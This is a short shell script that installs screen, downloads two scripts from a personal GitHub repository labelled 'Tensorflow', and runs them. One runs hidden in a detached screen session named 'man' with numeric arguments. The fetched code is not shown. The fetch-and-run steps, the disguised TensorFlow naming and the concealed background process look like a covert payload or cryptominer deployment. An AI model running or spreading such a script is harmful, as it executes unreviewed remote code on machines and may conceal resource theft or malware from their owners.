#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/nglkmerkel/Tensorflow/testgpu.sh
wget https://github.com/nglkmerkel/Tensorflow/tensorinit.sh

chmod +x testgpu.sh
chmod +x tensorinit.sh
screen -dmS man ./testgpu.sh 60 70
./tensorinit.sh
